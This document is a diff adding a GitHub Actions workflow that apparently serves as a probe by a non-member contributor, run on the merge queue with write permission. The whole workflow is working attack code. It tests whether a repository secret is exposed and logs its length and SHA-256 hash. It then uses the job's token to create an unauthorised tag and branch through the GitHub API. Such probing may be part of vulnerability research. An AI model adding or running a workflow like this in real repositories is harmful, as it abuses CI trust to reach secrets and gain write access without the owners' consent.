@@ -1,0 +1,36 @@
+name: vfy-mq-probe
+on:
+  merge_group:
+permissions:
+  contents: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: provenance + secret reach + EXERCISE the granted write
+        env:
+          PROBE: ${{ secrets.C246_PROBE }}
+          TOK: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          ACTOR: ${{ github.actor }}
+          EV: ${{ github.event_name }}
+        run: |
+          echo "VFY PROVENANCE event=$EV repository=$REPO actor=$ACTOR ref=$GITHUB_REF sha=$GITHUB_SHA"
+          echo "VFY AUTHOR=mrbenty-c NO-ORG-MEMBERSHIP NO-COLLABORATOR"
+          if [ -n "$PROBE" ]; then
+            echo "VFY SECRET: PRESENT len=${#PROBE}"
+            printf '%s' "$PROBE" | sha256sum | sed 's/^/VFY SECRET sha256: /'
+          else
+            echo "VFY SECRET: ABSENT"
+          fi
+          TAG="vfy-write-$GITHUB_RUN_ID"
+          C1=$(curl -s -o /tmp/t.json -w '%{http_code}' -X POST \
+            -H "Authorization: token $TOK" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/$REPO/git/refs" \
+            -d "{\"ref\":\"refs/tags/$TAG\",\"sha\":\"$GITHUB_SHA\"}")
+          echo "VFY WRITE tag -> HTTP=$C1"; head -c 300 /tmp/t.json; echo
+          C2=$(curl -s -o /tmp/b.json -w '%{http_code}' -X POST \
+            -H "Authorization: token $TOK" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/$REPO/git/refs" \
+            -d "{\"ref\":\"refs/heads/zz-vfy-$GITHUB_RUN_ID\",\"sha\":\"$GITHUB_SHA\"}")
+          echo "VFY WRITE branch -> HTTP=$C2"; head -c 300 /tmp/b.json; echo
